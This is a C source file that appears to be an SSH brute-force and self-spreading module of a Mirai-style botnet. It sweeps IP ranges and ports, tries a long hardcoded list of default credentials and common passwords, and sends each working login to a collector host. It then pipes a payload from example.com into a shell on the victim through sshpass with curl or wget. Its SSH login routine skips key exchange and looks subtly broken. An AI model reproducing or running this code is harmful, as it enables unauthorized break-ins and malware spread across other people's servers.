#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "includes.h"
#include "ssh_bruteforce.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "attack.h"
extern int usleep(unsigned int);
static uint16_t ssh_common_ports[] = {
    22, 2222, 22222, 22000, 22022, 222, 2200, 8022, 10022,
    2223, 2224, 2225, 2226, 2227, 2228, 2229, 2230, 2231,
    2232, 2233, 2234, 2235, 2236, 2237, 2238, 2239, 2240
};
static struct ssh_cred_pair basic_creds[] = {
    {"root", "root"}, {"root", ""}, {"root", "admin"}, {"root", "password"},
    {"root", "123456"}, {"root", "toor"}, {"root", "root123"}, {"root", "rootroot"},
    {"root", "123"}, {"root", "1234"}, {"root", "12345"}, {"root", "1234567"},
    {"root", "12345678"}, {"root", "pass"}, {"root", "passwd"}, {"root", "qwerty"},
    {"root", "password123"}, {"root", "root1234"}, {"root", "root@123"}, {"root", "root123!"},
    {"admin", "admin"}, {"admin", ""}, {"admin", "password"}, {"admin", "123456"},
    {"admin", "admin123"}, {"admin", "admin@123"}, {"admin", "administrator"},
    {"admin", "Admin"}, {"admin", "ADMIN"}, {"admin", "admin1234"},
    {"admin", "admin!"}, {"admin", "admin#"}, {"admin", "admin$"}, {"admin", "admin%"},
    {"user", "user"}, {"user", "password"}, {"user", ""}, {"test", "test"},
    {"test", "test123"}, {"guest", "guest"}, {"guest", ""}, {"demo", "demo"},
    {"demo", "demo123"}, {"support", "support"}, {"support", "support123"},
    {"service", "service"}, {"operator", "operator"}, {"backup", "backup"},
    {"backup", "backup123"}, {"nagios", "nagios"}, {"monitoring", "monitoring"},
    {"monitor", "monitor"}, {"oracle", "oracle"}, {"postgres", "postgres"},
    {"ubuntu", "ubuntu"}, {"debian", "debian"}, {"centos", "centos"},
    {"redhat", "redhat"}, {"fedora", "fedora"}, {"pi", "raspberry"},
    {"pi", "raspberrypi"}, {"pi", "raspberry123"}, {"docker", "docker"},
    {"k8s", "k8s"}, {"kubernetes", "kubernetes"}, {"vagrant", "vagrant"},
    {"ansible", "ansible"}, {"jenkins", "jenkins"}, {"git", "git"},
    {"root", "123"}, {"root", "1234"}, {"root", "12345"}, {"root", "123456"},
    {"root", "1234567"}, {"root", "12345678"}, {"root", "123456789"},
    {"root", "1234567890"}, {"admin", "123"}, {"admin", "1234"},
    {"admin", "12345"}, {"admin", "123456"}, {"user", "123"},
    {"user", "1234"}, {"user", "123456"}, {"test", "123"},
    {"test", "1234"}, {"test", "123456"}, {"guest", "123"},
    {"guest", "123456"}, {"root", "password"}, {"root", "pass"},
    {"root", "passwd"}, {"root", "qwerty"}, {"root", "abc123"},
    {"admin", "password"}, {"admin", "pass"}, {"user", "password"},
    {"user", "pass"}, {"test", "password"}
};
#define BASIC_CREDS_COUNT (sizeof(basic_creds)/sizeof(basic_creds[0]))
#define SSH_COMMON_PORTS_COUNT (sizeof(ssh_common_ports)/sizeof(ssh_common_ports[0]))
static struct ssh_ip_cache ip_cache[SSH_BRUTE_CACHE_SIZE];
static int ip_cache_count = 0;
static void log_ssh_event(const char *event, ipv4_t ip, uint16_t port, const char *username, const char *password, const char *details)
{
    FILE *f = fopen("logs.txt", "a");
    if(!f) return;
    time_t now = time(NULL);
    struct tm *tm = localtime(&now);
    char time_str[64];
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", tm);
    fprintf(f, "[%s] [SSH-BRUTE] %s %d.%d.%d.%d:%d", 
            time_str, event,
            (ip>>24)&0xff, (ip>>16)&0xff, (ip>>8)&0xff, ip&0xff, port);
    if(username) fprintf(f, " %s", username);
    if(password) fprintf(f, ":%s", password);
    if(details) fprintf(f, " %s", details);
    fprintf(f, "\n");
    fclose(f);
}
static void ssh_report(ipv4_t addr, uint16_t port, const char *user, const char *pass)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;
    struct sockaddr_in cb;
    cb.sin_family = AF_INET;
    cb.sin_addr.s_addr = SCANIP;
    cb.sin_port = htons(9555);
    if (connect(fd, (struct sockaddr *)&cb, sizeof(cb)) == -1) {
        close(fd);
        return;
    }
    uint8_t zero = 0;
    uint16_t port_net = htons(port);
    send(fd, &zero, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, &addr, sizeof(ipv4_t), MSG_NOSIGNAL);
    send(fd, &port_net, sizeof(uint16_t), MSG_NOSIGNAL);
    uint8_t ulen = (uint8_t)strlen(user);
    uint8_t plen = (uint8_t)strlen(pass);
    if (ulen == 0) ulen = 1;
    if (plen == 0) plen = 1;
    send(fd, &ulen, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, user, ulen, MSG_NOSIGNAL);
    send(fd, &plen, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, pass, plen, MSG_NOSIGNAL);
    close(fd);
}
static int parse_cidr(const char *cidr_str, ipv4_t *base_ip, int *prefix_len, int *total_ips)
{
    if(!cidr_str) return 0;
    char cidr_copy[64];
    strncpy(cidr_copy, cidr_str, sizeof(cidr_copy) - 1);
    cidr_copy[sizeof(cidr_copy) - 1] = 0;
    char *slash = strchr(cidr_copy, '/');
    if(!slash) return 0;
    *slash = 0;
    char *ip_str = cidr_copy;
    *prefix_len = atoi(slash + 1);
    if(*prefix_len < 0 || *prefix_len > 32) return 0;
    *base_ip = inet_addr(ip_str);
    if(*base_ip == 0 || *base_ip == 0xffffffff) return 0;
    uint32_t base_ip_net = ntohl(*base_ip);
    uint32_t mask = (0xFFFFFFFF << (32 - *prefix_len)) & 0xFFFFFFFF;
    base_ip_net = base_ip_net & mask;
    *base_ip = htonl(base_ip_net);
    *total_ips = 1 << (32 - *prefix_len);
    if(*total_ips < 1 || *total_ips > 65536) return 0;
    return 1;
}
static void get_bot_ip_range(ipv4_t base_ip, int total_ips, int bot_id, int total_bots, ipv4_t *start_ip, ipv4_t *end_ip, int *ips_count)
{
    if(total_bots < 1) total_bots = 1;
    if(bot_id < 0) bot_id = 0;
    if(bot_id >= total_bots) bot_id = total_bots - 1;
    *ips_count = total_ips / total_bots;
    if(total_ips % total_bots != 0 && bot_id < total_ips % total_bots)
        (*ips_count)++;
    int offset = 0;
    for(int i = 0; i < bot_id; i++) {
        int bot_ips = total_ips / total_bots;
        if(total_ips % total_bots != 0 && i < total_ips % total_bots)
            bot_ips++;
        offset += bot_ips;
    }
    uint32_t base_ip_net = ntohl(base_ip);
    uint32_t start_ip_net = base_ip_net + offset;
    uint32_t end_ip_net = start_ip_net + *ips_count;
    *start_ip = htonl(start_ip_net);
    *end_ip = htonl(end_ip_net);
}
static int get_bot_id(void)
{
    static int cached_id = -1;
    if(cached_id != -1) return cached_id;
    FILE *f = fopen("/tmp/.bot_id", "r");
    if(f) {
        fscanf(f, "%d", &cached_id);
        fclose(f);
        return cached_id;
    }
    cached_id = rand_next() % 10000;
    f = fopen("/tmp/.bot_id", "w");
    if(f) {
        fprintf(f, "%d", cached_id);
        fclose(f);
    }
    return cached_id;
}
static int get_total_bots(uint8_t opts_len, struct attack_option *opts)
{
    int total = attack_get_opt_int(opts_len, opts, ATK_OPT_TOTAL_BOTS, 100);
    if(total < 1) total = 100;
    return total;
}
static int port_is_open(ipv4_t ip, uint16_t port)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd < 0) return 0;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip;
    addr.sin_port = htons(port);
    fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
    if(connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        if(errno != EINPROGRESS) {
            close(fd);
            return 0;
        }
    }
    fd_set write_fds;
    FD_ZERO(&write_fds);
    FD_SET(fd, &write_fds);
    struct timeval tv;
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    int ret = select(fd + 1, NULL, &write_fds, NULL, &tv);
    close(fd);
    return ret > 0;
}
static int detect_ssh_service(ipv4_t ip, uint16_t port, char *ssh_version, int version_len)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd < 0) return 0;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip;
    addr.sin_port = htons(port);
    fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
    if(connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        if(errno != EINPROGRESS) {
            close(fd);
            return 0;
        }
    }
    fd_set write_fds;
    FD_ZERO(&write_fds);
    FD_SET(fd, &write_fds);
    struct timeval tv;
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    if(select(fd + 1, NULL, &write_fds, NULL, &tv) <= 0) {
        close(fd);
        return 0;
    }
    char banner[256];
    FD_ZERO(&write_fds);
    FD_SET(fd, &write_fds);
    tv.tv_sec = 2;
    if(select(fd + 1, &write_fds, NULL, NULL, &tv) > 0) {
        if(FD_ISSET(fd, &write_fds)) {
            int len = recv(fd, banner, sizeof(banner) - 1, 0);
            if(len > 0) {
                banner[len] = 0;
                if(strstr(banner, "SSH-2.0") != NULL ||
                   strstr(banner, "SSH-1.99") != NULL ||
                   strstr(banner, "SSH-1.5") != NULL) {
                    char *ver_start = strstr(banner, "SSH-");
                    if(ver_start && version_len > 0) {
                        int ver_len = 0;
                        while(ver_start[ver_len] != '\r' && ver_start[ver_len] != '\n' && ver_len < version_len - 1)
                            ver_len++;
                        memcpy(ssh_version, ver_start, ver_len);
                        ssh_version[ver_len] = 0;
                    }
                    close(fd);
                    return 1;
                }
            }
        }
    }
    close(fd);
    return 0;
}
static int ssh_authenticate(int fd, const char *username, const char *password)
{
    fd_set read_fds;
    struct timeval tv;
    char banner[512];
    FD_ZERO(&read_fds);
    FD_SET(fd, &read_fds);
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    if(select(fd + 1, &read_fds, NULL, NULL, &tv) <= 0) return 0;
    if(!FD_ISSET(fd, &read_fds)) return 0;
    int len = recv(fd, banner, sizeof(banner) - 1, 0);
    if(len <= 0) return 0;
    banner[len] = 0;
    if(strstr(banner, "SSH-") == NULL) return 0;
    char client_banner[] = "SSH-2.0-OpenSSH_7.4\r\n";
    send(fd, client_banner, strlen(client_banner), MSG_NOSIGNAL);
    usleep(200000);
    char packet[1024];
    int pos = 0;
    uint32_t packet_len = 0;
    packet[pos++] = 0;
    packet[pos++] = 0;
    packet[pos++] = 0;
    packet[pos++] = 0;
    uint8_t msg_code = 50;
    packet[pos++] = msg_code;
    uint32_t username_len = strlen(username);
    uint32_t username_len_net = htonl(username_len);
    memcpy(packet + pos, &username_len_net, 4);
    pos += 4;
    memcpy(packet + pos, username, username_len);
    pos += username_len;
    uint32_t password_len = strlen(password);
    uint32_t password_len_net = htonl(password_len);
    memcpy(packet + pos, &password_len_net, 4);
    pos += 4;
    memcpy(packet + pos, password, password_len);
    pos += password_len;
    packet_len = htonl(pos - 4);
    memcpy(packet, &packet_len, 4);
    send(fd, packet, pos, MSG_NOSIGNAL);
    FD_ZERO(&read_fds);
    FD_SET(fd, &read_fds);
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    if(select(fd + 1, &read_fds, NULL, NULL, &tv) > 0) {
        if(FD_ISSET(fd, &read_fds)) {
            char resp[256];
            int resp_len = recv(fd, resp, sizeof(resp) - 1, 0);
            if(resp_len > 0) {
                resp[resp_len] = 0;
                if(resp_len >= 5 && resp[4] == 52) {
                    return 1;
                }
                if(strstr(resp, "success") != NULL) {
                    return 1;
                }
            }
        }
    }
    return 0;
}
static int is_ip_blocked(ipv4_t ip, uint16_t port)
{
    for(int i = 0; i < ip_cache_count; i++) {
        if(ip_cache[i].ip == ip && ip_cache[i].port == port) {
            if(ip_cache[i].blocked) {
                if(time(NULL) < ip_cache[i].block_until) {
                    return 1;
                } else {
                    ip_cache[i].blocked = 0;
                }
            }
            return 0;
        }
    }
    return 0;
}
static void handle_blocked(ipv4_t ip, uint16_t port)
{
    for(int i = 0; i < ip_cache_count; i++) {
        if(ip_cache[i].ip == ip && ip_cache[i].port == port) {
            ip_cache[i].blocked = 1;
            int delay = 60;
            if(ip_cache[i].block_until > time(NULL)) {
                delay = (ip_cache[i].block_until - time(NULL)) * 2;
                if(delay > 3600) delay = 3600;
            }
            ip_cache[i].block_until = time(NULL) + delay;
            return;
        }
    }
    if(ip_cache_count < SSH_BRUTE_CACHE_SIZE) {
        ip_cache[ip_cache_count].ip = ip;
        ip_cache[ip_cache_count].port = port;
        ip_cache[ip_cache_count].checked = 1;
        ip_cache[ip_cache_count].blocked = 1;
        ip_cache[ip_cache_count].block_until = time(NULL) + 60;
        ip_cache_count++;
    }
}
static void ssh_rate_limit(void)
{
    int delay = 100 + (rand_next() % 1900);
    usleep(delay * 1000);
}
static void ssh_auto_infect(ipv4_t ip, uint16_t port, const char *user, const char *pass)
{
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 %s@%d.%d.%d.%d 'curl -s https://example.com/payload.sh | sh' || sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 %s@%d.%d.%d.%d 'wget -qO- https://example.com/payload.sh | sh'",
             pass, user, (ip>>24)&0xff, (ip>>16)&0xff, (ip>>8)&0xff, ip&0xff,
             pass, user, (ip>>24)&0xff, (ip>>16)&0xff, (ip>>8)&0xff, ip&0xff);
    system(cmd);
    log_ssh_event("Infection", ip, port, user, pass, "attempted");
}
static void ssh_bruteforce_ip_port(ipv4_t ip, uint16_t port, int scan_mode, const char *dict_name)
{
    if(is_ip_blocked(ip, port)) {
        log_ssh_event("Blocked", ip, port, NULL, NULL, "skipping");
        return;
    }
    char ssh_version[64] = {0};
    if(!detect_ssh_service(ip, port, ssh_version, sizeof(ssh_version))) {
        return;
    }
    log_ssh_event("SSH detected", ip, port, NULL, NULL, ssh_version);
    for(int i = 0; i < BASIC_CREDS_COUNT; i++) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if(fd < 0) continue;
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = ip;
        addr.sin_port = htons(port);
        fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
        if(connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            if(errno != EINPROGRESS) {
                close(fd);
                continue;
            }
        }
        fd_set write_fds;
        FD_ZERO(&write_fds);
        FD_SET(fd, &write_fds);
        struct timeval tv;
        tv.tv_sec = 3;
        tv.tv_usec = 0;
        if(select(fd + 1, NULL, &write_fds, NULL, &tv) <= 0) {
            close(fd);
            continue;
        }
        log_ssh_event("Trying", ip, port, basic_creds[i].user, basic_creds[i].pass, NULL);
        if(ssh_authenticate(fd, basic_creds[i].user, basic_creds[i].pass)) {
            log_ssh_event("SUCCESS", ip, port, basic_creds[i].user, basic_creds[i].pass, NULL);
            ssh_report(ip, port, basic_creds[i].user, basic_creds[i].pass);
            close(fd);
            ssh_auto_infect(ip, port, basic_creds[i].user, basic_creds[i].pass);
            return;
        }
        close(fd);
        ssh_rate_limit();
        if((i + 1) % 3 == 0) {
            handle_blocked(ip, port);
            usleep(60000000);
        }
    }
    if(dict_name && strlen(dict_name) > 0) {
        log_ssh_event("Brute forcing", ip, port, NULL, NULL, dict_name);
        char dict_copy[256];
        strncpy(dict_copy, dict_name, sizeof(dict_copy) - 1);
        dict_copy[sizeof(dict_copy) - 1] = '\0';
        char *passwords[256];
        int dict_size = 0;
        char *token = strtok(dict_copy, ",");
        while(token && dict_size < 255) {
            while(*token == ' ') token++;
            if(*token != '\0') {
                passwords[dict_size] = token;
                dict_size++;
            }
            token = strtok(NULL, ",");
        }
        if(dict_size == 0) {
            const char *common_passwords[] = {
                "password", "123456", "12345678", "1234", "qwerty", "12345",
                "password123", "admin", "letmein", "welcome", "monkey", "1234567",
                "sunshine", "princess", "dragon", "passw0rd", "master", "hello",
                "freedom", "whatever", "qazwsx", "trustno1", "654321", "jordan23",
                "harley", "password1", "shadow", "superman", "qwerty123", "michael",
                "football", "jesus", "ninja", "mustang", "password123", "123123",
                "welcome123", "admin123", "admin123", "root123", "toor", "pass"
            };
            dict_size = sizeof(common_passwords) / sizeof(common_passwords[0]);
            for(int i = 0; i < dict_size; i++) {
                passwords[i] = (char *)common_passwords[i];
            }
        }
        for(int d = 0; d < dict_size; d++) {
            for(int u = 0; u < 10; u++) {
                const char *users[] = {"root", "admin", "user", "test", "guest", "ubuntu", "debian", "centos", "pi", "docker"};
                int fd = socket(AF_INET, SOCK_STREAM, 0);
                if(fd < 0) continue;
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_addr.s_addr = ip;
                addr.sin_port = htons(port);
                fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
                if(connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
                    if(errno != EINPROGRESS) {
                        close(fd);
                        continue;
                    }
                }
                fd_set write_fds;
                FD_ZERO(&write_fds);
                FD_SET(fd, &write_fds);
                struct timeval tv;
                tv.tv_sec = 3;
                tv.tv_usec = 0;
                if(select(fd + 1, NULL, &write_fds, NULL, &tv) <= 0) {
                    close(fd);
                    continue;
                }
                if(ssh_authenticate(fd, users[u], passwords[d])) {
                    log_ssh_event("SUCCESS", ip, port, users[u], passwords[d], "from dict");
                    ssh_report(ip, port, users[u], passwords[d]);
                    close(fd);
                    ssh_auto_infect(ip, port, users[u], passwords[d]);
                    return;
                }
                close(fd);
                ssh_rate_limit();
                if((d * 10 + u + 1) % 3 == 0) {
                    handle_blocked(ip, port);
                    usleep(60000000);
                }
            }
        }
    }
}
void attack_ssh_bruteforce(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    if(targs_len == 0 && opts_len == 0) return;
    rand_init();
    const char *cidr_str = attack_get_opt_str(opts_len, opts, ATK_OPT_CIDR_RANGE, NULL);
    static char cidr_buf[64];
    if(!cidr_str) {
        if(targs_len > 0 && targs[0].addr != 0) {
            snprintf(cidr_buf, sizeof(cidr_buf), "%d.%d.%d.%d/32",
                     (targs[0].addr>>24)&0xff, (targs[0].addr>>16)&0xff,
                     (targs[0].addr>>8)&0xff, targs[0].addr&0xff);
            cidr_str = cidr_buf;
        } else {
            log_ssh_event("No CIDR range", 0, 0, NULL, NULL, "missing cidr parameter");
            return;
        }
    }
    ipv4_t base_ip;
    int prefix_len, total_ips;
    if(!parse_cidr(cidr_str, &base_ip, &prefix_len, &total_ips)) {
        log_ssh_event("Invalid CIDR", 0, 0, NULL, NULL, cidr_str);
        return;
    }
    int bot_id = get_bot_id();
    int total_bots = get_total_bots(opts_len, opts);
    ipv4_t start_ip, end_ip;
    int ips_count;
    get_bot_ip_range(base_ip, total_ips, bot_id, total_bots, &start_ip, &end_ip, &ips_count);
    log_ssh_event("Starting scan", 0, 0, NULL, NULL, cidr_str);
    char range_str[128];
    snprintf(range_str, sizeof(range_str), "Bot %d range: %d.%d.%d.%d - %d.%d.%d.%d (%d IPs)",
             bot_id,
             (ntohl(start_ip)>>24)&0xff, (ntohl(start_ip)>>16)&0xff, (ntohl(start_ip)>>8)&0xff, ntohl(start_ip)&0xff,
             (ntohl(end_ip)>>24)&0xff, (ntohl(end_ip)>>16)&0xff, (ntohl(end_ip)>>8)&0xff, ntohl(end_ip)&0xff,
             ips_count);
    log_ssh_event("Bot range", 0, 0, NULL, NULL, range_str);
    const char *dict_name = attack_get_opt_str(opts_len, opts, ATK_OPT_DICT_NAME, NULL);
    int scan_mode = attack_get_opt_int(opts_len, opts, ATK_OPT_SCAN_MODE, 0);
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 16);
    if(threads > SSH_BRUTE_MAX_THREADS) threads = SSH_BRUTE_MAX_THREADS;
    ipv4_t current_ip = start_ip;
    uint32_t start_ip_net = ntohl(start_ip);
    uint32_t end_ip_net = ntohl(end_ip);
    for(uint32_t ip_net = start_ip_net; ip_net < end_ip_net; ip_net++) {
        current_ip = htonl(ip_net);
        if(scan_mode == 0) {
            for(int p = 0; p < SSH_COMMON_PORTS_COUNT; p++) {
                ssh_bruteforce_ip_port(current_ip, ssh_common_ports[p], scan_mode, dict_name);
                usleep(rand_next() % 100000);
            }
        } else if(scan_mode == 1) {
            for(uint32_t port = 1; port <= 65535; port++) {
                uint16_t p = (uint16_t)port;
                if(port_is_open(current_ip, p)) {
                    char ssh_ver[64] = {0};
                    if(detect_ssh_service(current_ip, p, ssh_ver, sizeof(ssh_ver))) {
                        ssh_bruteforce_ip_port(current_ip, p, scan_mode, dict_name);
                    }
                }
                if(port % 1000 == 0) usleep(10000);
            }
        } else {
            for(int p = 0; p < SSH_COMMON_PORTS_COUNT; p++) {
                ssh_bruteforce_ip_port(current_ip, ssh_common_ports[p], scan_mode, dict_name);
            }
            for(uint32_t port = 1; port <= 65535; port++) {
                uint16_t p = (uint16_t)port;
                if(port % 100 == 0 && port_is_open(current_ip, p)) {
                    char ssh_ver[64] = {0};
                    if(detect_ssh_service(current_ip, p, ssh_ver, sizeof(ssh_ver))) {
                        ssh_bruteforce_ip_port(current_ip, p, scan_mode, dict_name);
                    }
                }
            }
        }
        usleep(rand_next() % 50000);
    }
    log_ssh_event("Scan complete", 0, 0, NULL, NULL, cidr_str);
}
